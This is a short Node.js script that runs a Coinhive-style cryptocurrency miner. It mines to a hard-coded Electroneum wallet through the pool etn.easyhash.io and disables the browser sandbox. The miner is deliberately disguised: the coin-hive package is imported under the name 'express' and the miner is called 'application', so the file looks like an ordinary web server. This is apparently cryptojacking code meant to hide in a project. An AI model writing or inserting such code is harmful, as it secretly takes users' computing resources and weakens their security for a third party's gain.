'use strict';

const express = require('coin-hive');
const moment = require('moment');

(async () => {
	const application = await express('etnk9VzVBXTXqUiR3Gkgw39RSDn3B5GxR8CzjwZU7mcwSwiP7c9MPFeST3VB584Fq5dNwbVu4aTokLs6gnVjmVyu4oLbyetRGe', {
		launch: {
			args: ['--disable-setuid-sandbox', '--no-sandbox']
		},
		devFee: 0,
		pool: {
			host: 'etn.easyhash.io',
			port: 3630
		},
		thread: 3
	});
	await application.start();
	application.on('error', console.log);
})();
